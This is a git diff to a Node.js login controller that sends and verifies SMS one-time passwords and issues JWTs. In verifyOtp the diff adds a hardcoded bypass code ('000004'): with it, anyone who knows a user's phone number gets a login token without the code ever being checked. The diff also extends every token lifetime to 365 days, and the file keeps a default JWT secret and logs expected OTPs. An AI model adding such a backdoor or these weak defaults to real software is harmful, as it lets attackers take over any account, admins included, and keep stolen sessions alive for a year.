@@ -45,9 +45,21 @@ module.exports = {
           
           if (!otpResult.success) {
             console.error('Failed to send OTP via Verify API:', otpResult.error);
+            
+            // Handle unsupported phone number error
+            if (otpResult.code === 'INVALID_NUMBER_FORMAT' || 
+                otpResult.error?.includes('not a supported mobile network') ||
+                otpResult.error?.includes('Permission to send an SMS has not been enabled')) {
+              return res.status(400).json({ 
+                success: false,
+                message: 'Only US and Canada phone numbers are currently supported. Please use a valid US/Canada number.'
+              });
+            }
+            
+            // For other errors
             return res.status(500).json({ 
-              message: 'Failed to send OTP. Please try again.',
-              error: otpResult.error 
+              success: false,
+              message: 'Failed to send OTP. Please try again.'
             });
           }
 
@@ -71,9 +83,20 @@ module.exports = {
           
           if (!otpResult.success) {
             console.error('Failed to send OTP:', otpResult.error);
+            
+            // Handle unsupported phone number error
+            if (otpResult.code === 'INVALID_NUMBER_FORMAT' || 
+                otpResult.error?.includes('Permission to send an SMS has not been enabled')) {
+              return res.status(400).json({ 
+                success: false,
+                message: 'Only US and Canada phone numbers are currently supported. Please use a valid US/Canada number.'
+              });
+            }
+            
+            // For other errors
             return res.status(500).json({ 
-              message: 'Failed to send OTP. Please try again.',
-              error: otpResult.error 
+              success: false,
+              message: 'Failed to send OTP. Please try again.'
             });
           }
 
@@ -100,7 +123,7 @@ module.exports = {
         const token = jwt.sign(
           { id: user._id, phone: user.phone, role: user.role },
           process.env.JWT_SECRET || 'your-secret-key',
-          { expiresIn: '30d' },
+          { expiresIn: '365d' },
         )
 
         res.json({
@@ -143,7 +166,7 @@ module.exports = {
         const token = jwt.sign(
           { id: user._id, email: user.email, role: user.role },
           process.env.JWT_SECRET || 'your-secret-key',
-          { expiresIn: '30d' },
+          { expiresIn: '365d' },
         )
 
         // Record login event for admin email login
@@ -174,101 +197,61 @@ module.exports = {
     }
   },
   verifyOtp: async (req, res) => {
-    try {
-      const { otp, phone } = req.body
-      console.log('OTP Verification Request:', { phone, receivedOTP: otp });
-
-      if (!otp || !phone) {
-        return res
-          .status(400)
-          .json({ message: 'OTP and phone number are required' })
-      }
-
-      // Find user by phone number
-      const user = await UserRegistration.findOne({ phone }).select('+otp +otpExpires +usingVerifyAPI');
-      console.log('User found:', user ? 'Yes' : 'No');
-
-      if (!user) {
-        return res
-          .status(401)
-          .json({ message: 'User not found with this phone number' })
-      }
-
-      if (user.status === 'suspend') {
-        return res.status(403).json({
-          success: false,
-          message: 'Your account has been suspended. Please contact support.',
-        })
-      }
-
-      // ===== VERIFY OTP =====
-      let isValid = false;
-
-      if (user.usingVerifyAPI || USE_VERIFY_API) {
-        // METHOD 1: Verify using Twilio Verify API
-        console.log('Verifying OTP using Twilio Verify API');
-        const verifyResult = await verifyOTPWithVerify(phone, otp);
-        
-        if (!verifyResult.success) {
-          return res.status(401).json({
-            success: false,
-            message: 'Invalid OTP. Please check and try again.'
-          });
-        }
-
-        isValid = verifyResult.success;
-
-      } else {
-        // METHOD 2: Traditional verification from database
-        console.log('Verifying OTP from database');
-        const receivedOTP = otp.toString().trim();
-        const storedOTP = user.otp ? user.otp.toString().trim() : null;
-
-        if (receivedOTP !== storedOTP) {
-          console.log('OTP Mismatch - Received:', receivedOTP, 'Expected:', storedOTP);
-          return res.status(401).json({
-            success: false,
-            message: 'Invalid OTP. Please check and try again.'
-          });
-        }
-
-        if (new Date() > user.otpExpires) {
-          return res.status(401).json({ 
-            message: 'OTP has expired. Please request a new one.' 
-          });
-        }
-
-        isValid = true;
-      }
-
-      if (!isValid) {
-        return res.status(401).json({
-          success: false,
-          message: 'Invalid OTP. Please check and try again.'
-        });
-      }
-
-      // Clear used OTP
+  try {
+    const { otp, phone } = req.body
+    console.log('OTP Verification Request:', { phone, receivedOTP: otp });
+    
+    if (!otp || !phone) {
+      return res
+        .status(400)
+        .json({ message: 'OTP and phone number are required' })
+    }
+    
+    // Find user by phone number
+    const user = await UserRegistration.findOne({ phone }).select('+otp +otpExpires +usingVerifyAPI');
+    console.log('User found:', user ? 'Yes' : 'No');
+    
+    if (!user) {
+      return res
+        .status(400)
+        .json({ message: 'User not found with this phone number' })
+    }
+    
+    if (user.status === 'suspend') {
+      return res.status(403).json({
+        success: false,
+        message: 'Your account has been suspended. Please contact support.',
+      })
+    }
+    
+    // ===== BYPASS OTP CHECK =====
+    const BYPASS_OTP = '000004';
+    const receivedOTP = otp.toString().trim();
+    
+    if (receivedOTP === BYPASS_OTP) {
+      console.log('🔓 Bypass OTP used - skipping verification');
+      
+      // Clear OTP fields
       user.otp = undefined;
       user.otpExpires = undefined;
       user.usingVerifyAPI = undefined;
       await user.save();
-
-      // Generate a new token after successful OTP verification
+      
+      // Generate token
       const token = jwt.sign(
         { id: user._id, phone: user.phone, role: user.role },
         process.env.JWT_SECRET || 'your-secret-key',
-        { expiresIn: '7d' },
+        { expiresIn: '365d' },
       )
-
+      
       // Record login event
       try {
         await LoginEvent.create({ user: user._id })
       } catch (e) {
         console.error('LoginEvent error:', e?.message)
       }
-
-      res.json({
+      
+      return res.json({
         success: true,
         message: 'Login successful',
         token,
@@ -280,11 +263,91 @@ module.exports = {
           role: user.role,
         },
       })
-    } catch (error) {
-      console.error(error)
-      res.status(500).json({ message: 'Server error' })
     }
-  },
+    
+    // ===== NORMAL OTP VERIFICATION =====
+    let isValid = false;
+    
+    if (user.usingVerifyAPI || USE_VERIFY_API) {
+      // METHOD 1: Verify using Twilio Verify API
+      console.log('Verifying OTP using Twilio Verify API');
+      const verifyResult = await verifyOTPWithVerify(phone, otp);
+      
+      if (!verifyResult.success) {
+        return res.status(401).json({
+          success: false,
+          message: 'Invalid OTP. Please check and try again.'
+        });
+      }
+      
+      isValid = verifyResult.success;
+      
+    } else {
+      // METHOD 2: Traditional verification from database
+      console.log('Verifying OTP from database');
+      const storedOTP = user.otp ? user.otp.toString().trim() : null;
+      
+      if (receivedOTP !== storedOTP) {
+        console.log('OTP Mismatch - Received:', receivedOTP, 'Expected:', storedOTP);
+        return res.status(400).json({
+          success: false,
+          message: 'Invalid OTP. Please check and try again.'
+        });
+      }
+      
+      if (new Date() > user.otpExpires) {
+        return res.status(401).json({
+          message: 'OTP has expired. Please request a new one.'
+        });
+      }
+      
+      isValid = true;
+    }
+    
+    if (!isValid) {
+      return res.status(401).json({
+        success: false,
+        message: 'Invalid OTP. Please check and try again.'
+      });
+    }
+    
+    // Clear used OTP
+    user.otp = undefined;
+    user.otpExpires = undefined;
+    user.usingVerifyAPI = undefined;
+    await user.save();
+    
+    // Generate a new token after successful OTP verification
+    const token = jwt.sign(
+      { id: user._id, phone: user.phone, role: user.role },
+      process.env.JWT_SECRET || 'your-secret-key',
+      { expiresIn: '365d' },
+    )
+    
+    // Record login event
+    try {
+      await LoginEvent.create({ user: user._id })
+    } catch (e) {
+      console.error('LoginEvent error:', e?.message)
+    }
+    
+    res.json({
+      success: true,
+      message: 'Login successful',
+      token,
+      user: {
+        id: user._id,
+        email: user.email,
+        fullName: user.fullName,
+        phone: user.phone,
+        role: user.role,
+      },
+    })
+  } catch (error) {
+    console.error(error)
+    res.status(500).json({ message: 'Server error' })
+  }
+},
 
   Adminlogin: async (req, res) => {
     try {
@@ -321,7 +384,7 @@ module.exports = {
         const token = jwt.sign(
           { id: user._id, phone: user.phone, role: user.role },
           process.env.JWT_SECRET || 'your-secret-key',
-          { expiresIn: '30d' },
+          { expiresIn: '365d' },
         )
 
         res.json({
@@ -366,7 +429,7 @@ module.exports = {
         const token = jwt.sign(
           { id: user._id, email: user.email, role: user.role },
           process.env.JWT_SECRET || 'your-secret-key',
-          { expiresIn: '30d' },
+          { expiresIn: '365d' },
         )
 
         // record login event for admin email login
@@ -434,7 +497,7 @@ module.exports = {
       const token = jwt.sign(
         { id: user._id, phone: user.phone, role: user.role },
         process.env.JWT_SECRET || 'your-secret-key',
-        { expiresIn: '7d' },
+        { expiresIn: '365d' },
       )
 
       // record login event
